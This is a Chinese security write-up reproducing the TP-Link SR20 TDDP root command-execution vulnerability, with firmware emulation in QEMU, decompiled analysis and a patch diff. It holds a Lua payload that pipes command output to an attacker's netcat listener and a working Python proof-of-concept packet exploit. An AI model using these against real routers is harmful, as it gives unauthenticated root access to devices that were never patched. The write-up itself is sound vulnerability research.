---
description: 知道创宇404 ScanV 安全服务团队
---

# TP-Link SR20 本地网络远程代码执行漏洞

## 简述

3月26号 Google 安全开发人员 Matthew Garrett在 Twitter 上公布了 TP-Link Smart Home Router \(SR20\) 的远程代码执行漏洞，公布的原因是他去年 12 月份将相关漏洞报告提交给 TP-Link后没有收到任何回复，于是就公开了，该漏洞截至目前官方修复，在最新固件中漏洞仍然存在，属于 0day 漏洞，当我看到漏洞证明代码\(POC\)后决定尝试重现此漏洞

  
TP-Link SR20 是一款支持 Zigbee 和 Z-Wave 物联网协议可以用来当控制中枢 Hub 的触屏 Wi-Fi 路由器，此远程代码执行漏洞允许用户在设备上以 root 权限执行任意命令，该漏洞存在于 TP-Link 设备调试协议\(TP-Link Device Debug Protocol 英文简称 TDDP\) 中，TDDP 是 TP-Link 申请了专利的调试协议，基于 UDP 运行在 1040 端口

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902175944477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 `0x31` 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞  


![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902180003492.png)

## 漏洞复现

根据[文章](https://paper.seebug.org/879/)的描述，漏洞的基理为：TP-Link SR20 设备运行了 V1 版本的 TDDP 协议，V1 版本无需认证，只需往 SR20 设备的 UDP 1040 端口发送数据，且数据的第二字节为 `0x31` 时，SR20 设备会连接发送该请求设备的 TFTP 服务下载相应的文件并使用 LUA 解释器以 root 权限来执行，这就导致存在远程代码执行漏洞。

首先是对漏洞进行复现，后面再对漏洞原理进行分析。

首先是固件下载，固件可在[官网](https://www.tp-link.com/us/support/download/sr20/#Firmware)进行下载。最新的固件版本为[SR20\(US\)\_V1\_190401](https://static.tp-link.com/2019/201904/20190402/SR20%28US)\_V1\_190401.zip\)，此为已经修复漏洞的版本。存在漏洞的版本为[SR20\(US\)\_V1\_180518](https://static.tp-link.com/2018/201806/20180611/SR20%28US)\_V1\_180518.zip\)。将两个版本的固件都下下来，后续还会使用bindiff对二者进行比对，来看是如何修复该漏洞的。

接着是环境搭建，最主要的是qemu和binwalk的安装。环境搭建的过程可以参考之前的[文章](https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow)，同时一键安装iot环境的[脚本](https://github.com/ray-cp/Tool_Script/blob/master/iot_env_install.md)，也可以用用，虽然不全，但是也包含了一些，还需要手动操作的就是以系统模式运行qemu的时候还需要配置下网卡。

固件和环境都配好了以后，接下来就是解压固件，使用以下命令将漏洞版本的文件系统提取出来：

```text
binwalk -Me sr20.bin
```

然后查看文件类型：

```text
$ file ./squashfs-root/bin/busybox
./squashfs-root/bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped
```

可以看到文件是基于arm 32位的小端ELF文件。

### qemu分析环境模拟

接着使用qemu系统模式运行起来一个arm虚拟机，虚拟机的下载地址为[https://people.debian.org/~aurel32/qemu/armhf/](https://people.debian.org/~aurel32/qemu/armhf/)，运行命令为（需配置好网络，可参考[文章](https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#qemu%E6%A8%A1%E6%8B%9F%E8%BF%90%E8%A1%8Cmips%E7%B3%BB%E7%BB%9F)）：

ARM CPU 有两个矢量浮点（软浮点和硬浮点）具体区别可以查看 Stackoverflow，本次选择使用硬浮点 armhf

从 Debian 官网下载 QEMU 需要的 Debian ARM 系统的三个文件:

* debian\_wheezy\_armhf\_standard.qcow2 2013-12-17 00:04 229M
* initrd.img-3.2.0-4-vexpress 2013-12-17 01:57 2.2M
* vmlinuz-3.2.0-4-vexpress 2013-09-20 18:33 1.9M

把以上三个文件放在同一个目录执行以下命令

```text
$ sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡
$ sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址
$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
123
```

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902180458501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902180507266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

虚拟机启动成功后会提示登陆

用户名和密码都为 `root`

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902180525642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

配置网卡IP

```text
ifconfig eth0 10.10.10.2/24
```

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190902180544225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

此时 QEMU 虚拟机可以与宿主机进行网络通信

### 固件打包上传到qemu虚拟机

在宿主机中压缩文件系统并启动web服务：

```text
tar jcf tar -jcf squashfs-root.tar.bz2 squashfs-root
python -m SimpleHTTPServer 80
```

然后在qemu虚拟机中下载文件系统:

```text
wget http://10.10.10.1/squashfs-root.tar.bz2
tar jxf squashfs-root.tar.bz2
```

接着使用 chroot 切换根目录固件文件系统。

```text
mount -o bind /dev ./squashfs-root/dev/
mount -t proc /proc/ ./squashfs-root/proc/
chroot squashfs-root sh # 切换根目录后执行新目录结构下的 sh shell
```

使用 chroot 后，系统读取的是新根下的目录和文件，也就是固件的目录和文件。 chroot 默认不会切换 /dev 和 /proc, 因此切换根目录前需要现挂载这两个目录。

到此可以看到已经切换到了该固件的环境

```text
root@debian-armhf:~/work# mount -o bind /dev ./squashfs-root/dev/
root@debian-armhf:~/work# mount -t proc /proc/ ./squashfs-root/proc/
root@debian-armhf:~/work# chroot squashfs-root sh


BusyBox v1.19.4 (2018-05-18 20:52:39 PDT) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ #
```

然后宿主机中安装ftp服务器：

```text
sudo apt install tftpd-hpa
```

配置ftp服务：

```text
# /etc/default/tftpd-hpa

TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/tftpboot"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure"
```

配置目录

```text
sudo mkdir /tftproot
sudo chmod 777 /tftproot
```

启动服务

```text
sudo service tftpd-hpa start
```

### 实际展示

前面都是准备环境的环节，接着就是复现漏洞的真正操作部分了。

重现步骤为：

1. QEMU 虚拟机中启动 tddp 程序
2. 宿主机使用 NC 监听端口
3. 执行 POC，获取命令执行结果

在 atftp 的根目录 `/tftpboot` 下写入 payload 文件  
payload 文件内容为：

```text
function config_test(config)
  os.execute("id | nc 10.10.10.1 1337")
end
```



![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190903105933851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)

接着在qemu虚拟机中启动tddp程序。

![](../../.gitbook/assets/image%20%28100%29.png)

然后在宿主机中监听1337端口。

![](../../.gitbook/assets/image%20%28102%29.png)

最后执行poc，就可以看到nc连回的结果了，我后面使用pwntools重写了之前的poc，因此这里就不贴出poc了，在后面再给出链接。

![](../../.gitbook/assets/image%20%28101%29.png)

```python
#!/usr/bin/python3

# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0

# Create a file in your tftp directory with the following contents:
#
#function config_test(config)
#  os.execute("telnetd -l /bin/login.sh")
#end
#
# Execute script as poc.py remoteaddr filename

import sys
import binascii
import socket

port_send = 1040
port_receive = 61000

tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(('', port_receive))

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s;arbitrary" % sys.argv[2]
packet = packet + argument.encode()
sock_send.sendto(packet, (sys.argv[1], port_send))
sock_send.close()

response, addr = sock_receive.recvfrom(1024)
r = response.encode('hex')
print(r)
```

### 漏洞分析 <a id="toc-4"></a>

根据漏洞描述以及相应的报告知道了漏洞出现在程序`tddp`中，搜索该程序，得到该程序的路径为`/usr/bin/tddp`，将该程序拖入IDA中进行分析。

程序规模不大，看起来和一般的pwn题差不多，所以我也就从main函数开始看了，经过重命名的main函数如下。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162059-c5733252-c4b5-1.png)

关键代码在`tddp_task_handle`中，跟进去该函数，看到函数进行了内存的初始化以及socket的初始化，在端口1040进行了端口监听，同时也可以看到这些字符串也是poc执行代码中命令行界面中显示出来的字符串。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162125-d50d5aee-c4b5-1.png)

进入的关键函数为`tddp_type_handle`，跟进去该函数。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162142-df1774b6-c4b5-1.png)

可以看到该在代码里首先使用`recvfrom`接收了最多0xAFC8字节的数据，然后判断第一个字节是否为1或2，根据前面说明的tddp协议的格式，知道第一个字节为`version`字段。图中截出的为`version`为1的情况，进入到`tddp_version1_type_handle`函数中。跟进去该函数。

```text
int __fastcall tddp_version1_type_handle(tddp_ctx *ctx, _DWORD *count)
{
  uint32_t v2; // r0
  __int16 v3; // r2
  uint32_t v4; // r0
  __int16 v5; // r2
  _DWORD *v7; // [sp+0h] [bp-24h]
  char *v9; // [sp+Ch] [bp-18h]
  char *v10; // [sp+10h] [bp-14h]
  int v11; // [sp+1Ch] [bp-8h]

  v7 = count;
  v10 = ctx->rev_buff;
  v9 = ctx->some_buff;
  ctx->some_buff[0] = 1;
  switch ( ctx->rev_buff[1] )                   // check type
  {
    case 4:
      printf("[%s():%d] TDDPv1: receive CMD_AUTO_TEST\n", "tddp_parserVerOneOpt", 697);
      v11 = CMD_AUTO_TEST(ctx);
      break;
    case 6:
      printf("[%s():%d] TDDPv1: receive CMD_CONFIG_MAC\n", 103928, 638);
      v11 = CMD_CONFIG_MAC(ctx);
      break;
    case 7:
      printf("[%s():%d] TDDPv1: receive CMD_CANCEL_TEST\n", "tddp_parserVerOneOpt", 648);
      v11 = CMD_CANCEL_TEST(ctx);
      if ( !ctx || !(ctx->field_2C & 4) || !ctx || !(ctx->field_2C & 8) || !ctx || !(ctx->field_2C & 0x10) )
        ctx->field_2C &= 0xFFFFFFFD;
      ctx->rev_flag = 0;
      ctx->field_2C &= 0xFFFFFFFE;
      break;
    case 8:
      printf("[%s():%d] TDDPv1: receive CMD_REBOOT_FOR_TEST\n", "tddp_parserVerOneOpt", 702);
      ctx->field_2C &= 0xFFFFFFFE;
      v11 = 0;
      break;
    case 0xA:
      printf("[%s():%d] TDDPv1: receive CMD_GET_PROD_ID\n", 103928, 643);
      v11 = CMD_GET_PROD_ID(ctx);
      break;
    case 0xC:
      printf("[%s():%d] TDDPv1: receive CMD_SYS_INIT\n", 103928, 615);
      if ( ctx && ctx->field_2C & 2 )
      {
        v9[1] = 4;
        v9[3] = 0;
        v9[2] = 1;
        v2 = htonl(0);
        *((_WORD *)v9 + 2) = v2;
        v9[6] = BYTE2(v2);
        v9[7] = HIBYTE(v2);
        v3 = ((unsigned __int8)v10[9] << 8) | (unsigned __int8)v10[8];
        v9[8] = v10[8];
        v9[9] = HIBYTE(v3);
        v11 = 0;
      }
      else
      {
        ctx->field_2C &= 0xFFFFFFFE;
        v11 = -10411;
      }
      break;
    case 0xD:
      printf("[%s():%d] TDDPv1: receive CMD_CONFIG_PIN\n", 103928, 682);
      v11 = CMD_CONFIG_PIN(ctx);
      break;
    case 0x30:
      printf("[%s():%d] TDDPv1: receive CMD_FTEST_USB\n", 103928, 687);
      v11 = CMD_FTEST_USB(ctx);
      break;
    case 0x31:
      printf("[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n", "tddp_parserVerOneOpt", 692);
      v11 = CMD_FTEST_CONFIG(ctx);
      break;
    default:
      printf("[%s():%d] TDDPv1: receive unknown type: %d\n", 103928, 713, (unsigned __int8)ctx->rev_buff[1], count);
      v9[1] = v10[1];
      v9[3] = 2;
      v9[2] = 2;
      v4 = htonl(0);
      *((_WORD *)v9 + 2) = v4;
      v9[6] = BYTE2(v4);
      v9[7] = HIBYTE(v4);
      v5 = ((unsigned __int8)v10[9] << 8) | (unsigned __int8)v10[8];
      v9[8] = v10[8];
      v9[9] = HIBYTE(v5);
      v11 = -10302;
      break;
  }
  *v7 = ntohl(((unsigned __int8)v9[7] << 24) | ((unsigned __int8)v9[6] << 16) | ((unsigned __int8)v9[5] << 8) | (unsigned __int8)v9[4])
      + 12;
  return v11;
```

程序判断接收数据的第二字节，并根据其类型调用相关代码。根据协议格式，第二字节为`type`字段，同时根据poc，知道了出问题的类型为`0x31`。看上面的代码我们知道`0x31`对应为`CMD_FTEST_CONFIG`，看专利说明知道该字段为配置程序：

```text
[0049] For setting the configuration information and the configuration information, without subtype. Thus, this type of packet subtype SubType value is cleared (0x00)
```

跟进去该函数看是如何实现的：

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162202-eb23edac-c4b5-1.png)

可以看到该函数中就从数据中获取了字符串并形成命令`cd /tmp;tftp -gr %s %s`，即实现了使用`tftp`去连接过来的ip地址中下载相应的文件，并最终通过c代码调用该文件中的`config_test`函数，从而实现任意代码执行。

事实上，根据最终使用的是`execve`函数来执行tftp下载，该漏洞也可以形成一个命令注入漏洞。

至此，漏洞分析结束。

### 补丁比对 <a id="toc-5"></a>

最新版本的固件已经修复了该漏洞，我想比对下厂商是如何修复该漏洞的。用bindiff将该程序与最新版本的固件中的tddp程序进行对比。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162220-f5fa1e5e-c4b5-1.png)

可以看到`tddp_version1_type_handle`存在一定的差距，查看该函数的流程。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162234-fe0ba43c-c4b5-1.png)

可以看到流程图中部分的基本块被删除了，猜测是直接将`0x31`字段对应的基本块给删掉了来修复该漏洞。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162247-061d8988-c4b6-1.png)

点击各个基本块，可以看到确实是`CMD_FTEST_CONFIG`基本块被删掉了。同时也可以在ida中确认该基本块被删除。

## 小结

该漏洞只能称之为任意命令执行（ACE）而不是远程命令执行（RCE）的原因似乎是因为TDDP 服务只能通过有线网络访问，连 Wi-Fi 也不能访问，没有真机，不好确认，有点可惜。

总的来说，漏洞还是很简单的。tddp第一版协议竟然未对用户进行验证就允许执行如此强大的调试功能，实在是有点不应该。

相关代码和脚本在我的[github](https://github.com/ray-cp/Vuln_Analysis/tree/master/TP-Link_sr20_tddp_ACE)

## 参考链接

1. [重现 TP-Link SR20 本地网络远程代码执行漏洞](https://paper.seebug.org/879/)
2. [A Story About TP-link Device Debug Protocol \(TDDP\) Research](https://www.coresecurity.com/blog/story-about-tp-link-device-debug-protocol-tddp-research)
3. [Data communication method, system and processor among CPUs](https://patents.google.com/patent/CN102096654A/en)
4. \[[Remote code execution as root from the local network on TP-Link SR20 routers](https://mjg59.dreamwidth.org/51672.html)\]
5. [Download for SR20 V1](https://www.tp-link.com/us/support/download/sr20/#Firmware)
6. [lua学习笔记3-c调用lua](https://www.jianshu.com/p/008541576635)
7. [MIPS漏洞调试环境安装及栈溢出](https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow)

